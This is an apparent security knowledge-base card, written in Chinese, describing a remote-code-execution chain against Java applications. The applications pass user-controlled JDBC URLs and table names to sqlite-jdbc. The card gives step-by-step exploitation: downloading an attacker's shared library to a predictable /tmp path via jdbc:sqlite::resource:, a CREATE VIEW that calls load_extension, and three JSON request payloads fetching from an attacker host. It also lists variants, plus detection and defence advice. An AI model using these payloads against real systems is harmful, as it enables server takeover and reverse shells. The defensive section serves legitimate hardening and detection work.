---
id: web-java-deserialization-sqlite-jdbc-resource-url-tmp-file-write
title: 'sqlite-jdbc ::resource: 远程 URL 把攻击者文件落地到可预测 /tmp/sqlite-jdbc-tmp-hash.db，再借视图劫持 load_extension 加载该 .so'
type: scenario
domain: web
path: web/java/deserialization
technique: sqlite-jdbc-resource-url-tmp-file-write
tags:
- java
- jdbc
- sqlite
- file-write
- load-extension
- view-hijack
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-T2-2
  verified_at: '2026-11-07T23:44:33+08:00'
  notes: 已对照 16537 原文与 img/03 核对：原文第 3 节 sqlite 写文件+加载 so 的三步请求序列（jdbc:sqlite::resource:http://ip:port/poc.so 落地为 /tmp/sqlite-jdbc-tmp-<hash>.db、再落地含 CREATE VIEW security as SELECT (SELECT load_extension(...)) 的 db、最后 file:/tmp/...db?enable_load_extension=true&tableName=security 触发）与卡片一致；hashCode 命名规则与原文第 437 行写法一致。未验证点：该段原文是转述外部参考博客，未给出驱动代码级证据与实测回连，落地路径/视图重写属按机制推导，卡片已标 confidence medium；请求 2 能否直接触发视图也未证实。未 set-versions（原文本节无版本区间声明）。未执行原文请求。
url: /docs/web/java/deserialization/web-java-deserialization-sqlite-jdbc-resource-url-tmp-file-write/
draft: false
kb_aliases:
- jdbc:sqlite::resource
- sqlite-jdbc 远程资源落地
- sqlite-jdbc-tmp hash 预测
- CREATE VIEW 劫持 select
- 无上传点落地 so
---

## 一句话结论

`sqlite-jdbc` 支持 `jdbc:sqlite::resource:<http URL>`：驱动会把远程资源下载到 `/tmp/sqlite-jdbc-tmp-<hash>.db`，文件名只由 URL 的 `hashCode()` 决定、完全可预测。当应用同时允许用户控制 JDBC URL 与表名时，攻击者可以一次请求把恶意 `.so` 落到可预测的临时文件里（无需任何上传点），再打开一个含 `CREATE VIEW security AS SELECT (SELECT load_extension('/tmp/sqlite-jdbc-tmp-<hash>.db'))` 的数据库文件，让 `select * from security` 被视图重写成 `load_extension` 调用，实现 RCE。

## 原理

- **`:resource:` 前缀的语义**：`jdbc:sqlite::resource:http://host/x` 让驱动先用 HTTP 取到该资源，再以本地文件形式打开。驱动把它缓存进系统临时目录，命名规则为 `sqlite-jdbc-tmp-` + `new URL(url).hashCode()` + `.db`。因为 `hashCode()` 对同一字符串恒定，攻击者在本地算一遍就能知道落地路径，从而在 payload 里直接引用它。
- **落地内容由攻击者决定**：`:resource:` 只关心"把字节写到临时文件"，不校验扩展名和内容。把 `evil.so` 挂在攻击者服务器上，落地后虽然文件名是 `.db`，实际仍是 ELF 共享库，`load_extension` 只看格式不看后缀。
- **视图劫持**：SQLite 的 `CREATE VIEW v AS SELECT ...` 会把查询定义持久化进库文件；之后任何 `select * from v` 都会按定义重写执行。业务代码里那句 `"select * from " + tableName` 一旦把 `tableName` 取成视图名，执行的就是攻击者在库里预置的语句 —— 这不是 SQL 注入绕过，而是"输入就是一个合法的表/视图名，但语义被替换"。
- **为什么要两个文件**：第一个文件是 `.so`（用 `:resource:` 落到 tmp），第二个文件是含视图的 `.db`（同样用 `:resource:` 落到另一个 tmp）。第三个请求才用 `jdbc:sqlite:file:/tmp/<第二个 tmp 文件>?enable_load_extension=true` + `tableName=security` 触发。
- **为什么比"单条子查询注入"更强**：整条链不依赖 `tableName` 里的括号/SQL 语法拼接（视图名是干净标识符），因此能绕过只对 `tableName` 做标识符白名单过滤的实现；攻击面集中在 `url` 参数的 scheme 前缀上。
- 置信度说明：落地路径、视图重写、`load_extension` 三步在原文中以完整三请求序列给出，但未给出驱动侧逐行代码与实测回连结果，故标 confidence: medium。

## 触发条件

- 应用把用户可控的 JDBC URL 交给 `DriverManager.getConnection()`（数据源测试/导入连接类功能），且未限制 `jdbc:sqlite::resource:` 前缀。
- 同一接口允许用户控制"表名"，且实现为 `select * from <tableName>`。
- 目标能访问攻击者的 HTTP 服务（或可换成 `file:`/`jar:` 等其他可落地来源），`/tmp`（或驱动配置的临时目录）可写。
- 连接串允许 `enable_load_extension=true`；SQLite 不是 `SQLITE_OMIT_LOAD_EXTENSION` 编译。

## 利用步骤

1. 准备两个远程文件：`poc.so`（ELF 共享库，实现 `sqlite3_extension_init`，初始化里执行命令/反弹 shell）与 `poc.db`（一个正常的 SQLite 库，内含 `CREATE VIEW security AS SELECT (SELECT load_extension('/tmp/sqlite-jdbc-tmp-<hash1>.db'));`）。
2. 本地用 `new java.net.URL("http://attacker/poc.so").hashCode()` 算出 `<hash1>`、用 `new java.net.URL("http://attacker/poc.db").hashCode()` 算出 `<hash2>`，把 `<hash1>` 写进 `poc.db` 的视图定义里。
3. 请求 1：`{"type":"3","url":"jdbc:sqlite::resource:http://attacker/poc.so"}` —— 把 `evil.so` 落到 `/tmp/sqlite-jdbc-tmp-<hash1>.db`。
4. 请求 2：`{"type":"3","url":"jdbc:sqlite::resource:http://attacker/poc.db","tableName":"security"}` —— 下载含视图的库（此时若 `tableName` 已取视图名，可能直接触发；不能则继续第 5 步）。
5. 请求 3：`{"type":"3","url":"jdbc:sqlite:file:/tmp/sqlite-jdbc-tmp-<hash2>.db?enable_load_extension=true","tableName":"security"}` —— 打开第 2 步落地的库并查询 `security` 视图，视图重写为 `load_extension('/tmp/sqlite-jdbc-tmp-<hash1>.db')`，加载恶意库执行。

## PoC

```text
# poc.db 里的视图定义（hash1 = new URL("http://attacker/poc.so").hashCode()）
CREATE VIEW security AS SELECT ( SELECT load_extension('/tmp/sqlite-jdbc-tmp--<hash1>.db'));
```

```json
{"type":"3","url":"jdbc:sqlite::resource:http://attacker/poc.so"}
{"type":"3","url":"jdbc:sqlite::resource:http://attacker/poc.db","tableName":"security"}
{"type":"3","url":"jdbc:sqlite:file:/tmp/sqlite-jdbc-tmp-<hash2>.db?enable_load_extension=true","tableName":"security"}
```

```text
# 预测落地文件名（本地算，无需目标交互）
jshell> new java.net.URL("http://attacker/poc.so").hashCode()
```

## 变体与关联

- 变体：把 `:resource:` 换成 `jdbc:sqlite:/tmp/xxx.db` 直接读已有库；或用 `ATTACH DATABASE` 让 SQLite 自己写出文件（`attach database '/tmp/x.db' as x`）从而绕过"必须有上传点"的限制。
- 变体：视图换成 `CREATE TRIGGER`、或把视图定义指向 `(select writefile(...))` 之类自定义函数；表名位置也可以换成其他被拼接的标识符位。
- 关联：[[web-java-deserialization-sqlite-jdbc-table-name-select-injection-load-extension-rce]]（同产品、同 `load_extension` sink 的括号子查询注入版，本卡提供"不依赖注入语法"的落地与触发路径）、[[web-python-django-sql-explorer-load-extension-dll-rce]]（PHP/Python 生态里同类 `load_extension` 利用）。
- 边界：应用对 JDBC URL 做 scheme/主机白名单（禁止 `:resource:`）、表名从 `sqlite_master` 白名单校验、临时目录不可写或路径不可预测（驱动版本改变了命名规则）、`enable_load_extension` 被禁用时链不成立。

## 检测与防御

- 修复：JDBC URL 参数使用白名单（只允许 `jdbc:mysql/postgresql/sqlite:` 等固定前缀与固定主机），禁止 `:resource:`、`:memory:` 之外的自定义来源；表名不来自用户输入。
- 修复：连接层关闭 `enable_load_extension`，连接串拒绝该参数；SQLite 编译期加 `SQLITE_OMIT_LOAD_EXTENSION`。
- 加固：数据源测试功能运行在独立容器，`/tmp` 用 `noexec` 挂载或每次清理；限制进程对外发起任意 HTTP 下载。
- 检测：JDBC URL 中出现 `::resource:`、`enable_load_extension`；`/tmp` 出现 `sqlite-jdbc-tmp-*.db` 且内容是 ELF；数据库文件里出现含 `load_extension` 的 VIEW/TRIGGER 定义；Java 进程随后 spawn shell。
